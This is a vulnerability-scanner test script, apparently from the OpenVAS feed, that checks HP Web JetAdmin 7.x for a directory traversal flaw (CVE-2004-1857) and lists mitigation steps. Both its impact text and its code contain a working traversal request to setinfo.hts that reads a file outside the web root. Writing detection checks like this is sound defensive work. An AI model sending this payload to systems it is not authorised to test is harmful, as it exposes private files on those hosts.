# SPDX-FileCopyrightText: 2004 wirepair
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# Tested only on HP Web JetAdmin Version 7.5.2546 checks a file just outside
# of web root. I didn't want it to check for boot.ini in case its installed on
# a separate drive then we'll get a false positive... -wirepair

CPE = "cpe:/a:hp:web_jetadmin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12120");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1857");
  script_tag(name:"cvss_base", value:"2.1");
  script_tag(name:"cvss_base_vector", value:"AV:L/AC:L/Au:N/C:P/I:N/A:N");
  script_xref(name:"IAVA", value:"2004-B-0007");
  script_name("HP Jet Admin 7.x Directory Traversal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 wirepair");
  script_family("Web Servers");
  script_dependencies("gb_hp_web_jetadmin_detect.nasl");
  script_require_ports("Services/www", 8000);
  script_mandatory_keys("HpWebJetadmin/installed");

  script_tag(name:"solution", value:"To set a password for the HP Web Jet Admin service follow these steps:

  1. In the navigation menu select General Settings, and expand the tree.

  2. Expand Profiles Administration

  3. Select Add/Remove Profiles

  4. In the User Profiles page, if a password has not been set, select the
  'Note: To enable security features, an Admin password must be set.' link.

  5. Set an administrator password.

  It is strongly recommended that access be restricted by IP Addresses:

  1. Expand the General Settings tree.

  2. Select the HTTP (Web) branch.

  3. Under the 'Allow HP Web Jetadmin Access' add your administration IP host or
  range. HP Also recommends removing all files that are included in the test
  directory. On a default installation this would be in the directory
  C:\Program Files\HP Web Jetadmin\doc\plugins\hpjdwm\script\");

  script_tag(name:"summary", value:"The remote HP Web JetAdmin suffers from a number of vulnerabilities. The
  current running version is vulnerable to a directory traversal attack via the setinfo.hts script.");

  script_tag(name:"impact", value:"A remote attacker can access files by requesting the
  following string:

  /plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../hptrace.ini");

  script_xref(name:"URL", value:"http://sh0dan.org/files/hpjadmadv.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/9973");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( port:port, cpe:CPE, nofork:TRUE ) ) # nb: To have a reference to the Detection-VT
  exit( 0 );

url = "/plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../hptrace.ini";
req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( isnull( res ) ) exit( 0 );

if( res =~ "^HTTP/1\.[01] 200" && "traceLogfile=" >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
